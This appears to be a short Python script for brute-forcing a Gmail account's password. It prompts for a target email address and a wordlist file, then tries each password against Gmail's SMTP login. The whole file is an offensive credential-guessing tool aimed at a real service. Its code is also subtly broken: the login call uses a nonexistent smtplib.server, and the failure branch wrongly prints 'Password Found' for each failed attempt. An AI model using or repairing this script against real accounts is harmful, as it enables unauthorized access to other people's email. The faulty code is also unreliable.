from smtpd import SMTPServer
import smtplib 
from termcolor import colored

SMTPServer = smtplib.SMTP("smtp.gmail.com", 587)
SMTPServer.ehlo()
SMTPServer.starttls()

user = input("[*] Enter Target Email Address: ")
passwdfile = input("[*] Enter the path to the password file: ")
file = open(passwdfile, "r")

for password in file:
    password = password.strip('\n')
    try:
        smtplib.server.login(user, password)
        print(colored("[+] Password Found: %s" % password, 'green'))
        break

    except smtplib.SMTPAuthenticationError:
        print(colored("[+] Password Found: " + password, 'red'))